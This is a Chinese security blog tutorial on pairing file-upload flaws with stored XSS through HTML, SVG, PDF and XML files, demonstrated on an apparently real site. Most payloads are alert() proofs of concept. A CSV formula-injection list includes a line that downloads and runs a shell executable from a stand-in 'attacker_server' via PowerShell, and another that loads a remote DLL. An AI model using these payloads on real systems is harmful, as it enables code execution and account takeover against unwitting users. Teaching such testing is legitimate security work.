#  浅谈src挖掘中——文件上传和XSS漏洞的组合拳   
routing  网络安全者   2025-05-23 16:01  
  
## 0x1 前言  
  
哈喽，师傅们好！  
这次打算给师弟们分享的是XSS之Flash弹窗钓鱼和文件上传getshell各种姿势的内容，然后先是给小白师傅们简单介绍下XSS漏洞和文件上传漏洞。然后后面给师傅们简单演示了XSS之Flash弹窗钓鱼，然后后面很详细的介绍了文件上传和XSS漏洞的组合拳的好几种方式，后面也是通过对一个站点的测试，给师傅们演示了一波。后面给师傅们整理了下pdf木马制作的过程以及最后面分享下我一次在测文件上传最后也是getshell了。  
## 0x2 漏洞简介  
### 文件上传原理  
  
这里利用form表单  
标签和类型为file的Input标签来完成上传，要将表单数据编码格式置为 multipart/form-data  
 类型，这个编码类型会对文件内容在上传时进行处理，以便服务端处理程序解析文件类型与内容，完成上传操作。  
```
<formmethod="POST"enctype="multipart/form-data">
<inputtype="file"name="file"value="请选择文件"><br />
<inputtype="submit">
</form>
```  
## 0x3 浅谈上传XSS的各种类型姿势  
### 允许上传HTML或SVG  
  
允许上传html或者svg  
都可以能导致xss，也能导致任意URL跳转  
，甚至还能导致SSRF  
（很难利用），因为核心还是js代码可控；其中URL重定向漏洞可以参考之前我在先知写的文章：https://xz.aliyun.com/t/15069  
  
html造成XSS就不多说了，懂得都懂；  
主要说说svg文件如何造成xss。  
  
**检查思路：**  
  
1、创建一个恶意的svg文件，输入如下内容：  
```
<?xml version="1.0" encoding="UTF-8"?>

        alert('XSS Attack!');
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudfic0CNGy9SQULwvFrEwfEpFBGH39clupvf0MTNkVap2ia7ldf6bicuTPQ/640?wx_fmt=png&from=appmsg "")  
  
2、上传到文件中，并访问  
可以看到已经成功弹窗出来了XSS漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudn2xxB9p8aCVPI4q4ibwma2iaOEsnHxYo6KEENUvJbDkpQJObF3tWEUCA/640?wx_fmt=png&from=appmsg "")  
  
拓展：如果目标存在导出功能，如给svg导出为pdf这种功能，那么可能存在SSRF  
可尝试使用其他协议更直观的查看，如file://  
### 允许上传PDF文件  
  
可能存在PDF XSS和任意URL跳转，但是由于属于浏览器层面的漏洞，所以厂商大概率不认可。  
  
可以直接使用工具生成：https://www.xunjiepdf.com/editor  
  
也可以按照网上的操作，用迅捷PDF编辑器去操作，效果都一样  
  
因为pdf一般是后端的组件，有的开发可能配置成wkhtmltopdf /tmp/html123.htm /uploads/pdf.pdf  
 ，那就可直接利用file协议进行利用  
  
如果网站本身存在预览JS的地方，可以试试通过CVE-2024-4367  
来实现PDF XSS 获取Cookie、账户接管等。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudv0GSD96Q2pHgxicwxxtxpoF0HCVdmIfwSDiaGOqvdVRX8mwsnBAEKZtQ/640?wx_fmt=png&from=appmsg "")  
### 允许上传CSV文件  
  
如果允许上传CSV文件  
，且上传的CSV文件的内容未经过处理过滤直接保存，那么可以尝试上传具有恶意命令执行payload的CSV文件，当其他用户下载该CSV文件时，可能会导致命令执行。  
  
CSV  
文件的Payload  
如下：  
```
DDE ("cmd";"/C calc";"!A0")A0
<span class="label label-primary">@SUM(1+9)*cmd</span>|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```  
  
**检查思路：**  
1. 上传恶意的CSV文件  
  
1. 下载恶意的CSV文件  
  
1. 观察下载后的CSV文件是否对等号=  
等特殊符号做了处理，payloads会否会成功执行，如果能则说明存在问题  
  
## 0x4 组合拳实战测试  
### html、svg文件上传打XSS漏洞  
  
师傅们可以看到找到下面的这个站点的这个功能存在文件上传，我先尝试一手html文件，html文件上传相对来讲常见点，并且一般要是能够上传html文件成功，基本上都可以打一个存储型XSS漏洞了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudeJiaac5TgJz4ib5PTTmFtUeqbQia8lYib88f9GNskx1LJ6ykWzRCVvVaDA/640?wx_fmt=png&from=appmsg "")  
  
html恶意弹窗代码如下：  
  
html恶意弹窗代码如下：  
```
<!DOCTYPE html>
<htmllang="en">
<head>
<metacharset="UTF-8">
<metaname="viewport"content="width=device-width, initial-scale=1.0">
<title>Document</title>
<script>alert('618')</script>
</head>
<body>

</body>
</html>
```  
  
上传成功，可以看到我这里上传的html文件的url路径，下面尝试访问下这个路径，看看里面的html恶意弹窗代码会不会执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudiazhxMhiaVrxZHa6nfTwhccsvUaibeEZpHsjoLHkMb1m8zJzDHwWO5iaPw/640?wx_fmt=png&from=appmsg "")  
  
可以看到我这里换个浏览器访问，也是成功执行XSS弹窗了的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fud92vZSGWVqKCu8EOqXcD2QELoialNlyHXGfHuR2wsROefJn21RamDwJQ/640?wx_fmt=png&from=appmsg "")  
  
上传svg恶意文件也是一样的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudj5YBLFSQw7YSXnDfWZ5g98Crx0jGUTicdLO3wN8uWicVBdU7JYzJKFCA/640?wx_fmt=png&from=appmsg "")  
  
svg恶意弹窗代码如下：  
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svgPUBLIC"-//W3C//DTD SVG 1.1//EN""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svgversion="1.1"baseProfile="full"xmlns="http://www.w3.org/2000/svg">
<polygonid="triangle"points="0,0 0,50 50,0"fill="#009900"stroke="#004400"/>
<scripttype="text/javascript">
alert(618);
</script>
</svg>
```  
  
也是一样换个浏览器访问，照样是可以成功执行弹窗的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fud3z1y5w2HXuVtt2G7vdGO0VeYIWDUDfObUFMXzhuTS8rI3vqqH70APg/640?wx_fmt=png&from=appmsg "")  
### 制作pdf弹窗木马  
  
pdf编辑器下载地址如下：  
  
https://www.xunjiepdf.com/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudJictaqtCgpJuynrs15mc0T42IVeiar0LKdCpurGSFibw2kCGwmRrs38Sg/640?wx_fmt=png&from=appmsg "")  
  
直接打开然后新建空白页面，然后点击属性，然后点击右边的小点点  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudskcwribMeEFTYdibtcP6vB72rFA3E0C6KzjpPkxnmsHBgngtLQffaxsw/640?wx_fmt=png&from=appmsg "")  
  
然后出现下面的选项框，点击新增js代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudFgFjpGdOyVPwhtFSsAhR3iapCq77iabUPiamibQuuEJEA6hD2t0dibMAmEg/640?wx_fmt=png&from=appmsg "")  
  
写入app.alert(618);  
 js代码，然后保存到本地  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudQHxMCTc29FyNs3059F8PY3gqZW6xqS5yPwakS0d6DtmWfEen24P61A/640?wx_fmt=png&from=appmsg "")  
  
然后也是按照上面的一样步骤，也是可以打出一个存储型XSS漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudnOYAFp4HjSMMwfDG0jjGevDBIl0EXaMw8aAiabJLBicRMHqWQSiabBKdA/640?wx_fmt=png&from=appmsg "")  
### 上传XML文件打XSS漏洞  
  
**上传xml文件必须CORS允许所有域 CORS 跨域资源请求(允许我们网站加载其他网页代码)**  
- xml它需要上传2个文件  
  
- 首先上传第一个xml文件(url地址我们首先拿到)  
  
- 然后再上传第二个xml文件  
  
**xml1：**https://xxx.com/File/1/xxxxxx.xml  
```
<?xml version="1.0" encoding="iso-8859-1"?>

alert(/618/);
```  
  
然后上传xml2，代码中的href填写xml1的上传链接路径  
```
<?xml version="1.0" encoding="iso-8859-1"?>
<?xml-stylesheet type="text/xsl" href=""?>
```  
  
CURL查看：curl 域名 -H "Origin: https://baidu.com" -I  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccxXTp22BU2tZibibmictUl6fudZCAO3ysz2Rxm4ADqXUcjwJmL0S8z9a7IvibozwKc65suFULGHkNc1gg/640?wx_fmt=png&from=appmsg "")  
## 0x5 总结  
  
这篇文章对于仪式内容的介绍和分享就到这里了，然后后面要是有什么问题和需要交流的地方，师傅们可以跟我讨论下，里面的一些案例包括各种的打都写的蛮详细的，对小白师傅比较友好哈！  
最后，希望这篇文章对师傅们有帮助哈！！！  
  
**文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！**  
  
  
**关 注 有 礼**  
  
  
  
欢迎关注公众号：网络安全者  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/0JJXjA8siccxdOvXt6Ez07aIM7LibibYn72xDdQRRmiaHEcwp9ITScZkVHpjKib6iasJ79bHLHFUDJuPrDjiasCrWcORQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
本文内容来自网络，如有侵权请联系删除  
  
  
****  
